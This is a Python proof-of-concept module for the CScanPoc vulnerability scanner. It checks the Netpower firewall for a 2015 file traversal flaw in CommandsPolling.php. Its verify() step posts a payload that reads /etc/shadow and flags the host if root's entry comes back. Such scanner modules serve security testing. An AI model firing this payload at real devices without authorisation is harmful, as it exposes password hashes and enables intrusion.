# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Netpower_0011' # 平台漏洞编号，留空
    name = '中科网威防火墙 文件遍历'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_TRAVERSAL # 漏洞类型
    disclosure_date = '2015-09-16'  # 漏洞公布时间
    desc = '''
        中科网威防火墙 /direct/polling/CommandsPolling.php 函数逻辑错误，导致任意文件遍历。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '中科网威防火墙'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '73745102-3872-49c3-a1b2-dd2c21acf97a'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-22'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #info:http://www.wooyun.org/bugs/wooyun-2015-0140998
            hh = hackhttp.hackhttp()
            url = self.target + '/direct/polling/CommandsPolling.php'
            postdata = "command=ping&filename=/etc/shadow&cmdParam=qq.com"
            code, head, res, errcode, _ = hh.http(url, post=postdata)
            if code == 200 and '"data":["dealing","root' in res:
                #security_hole(url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
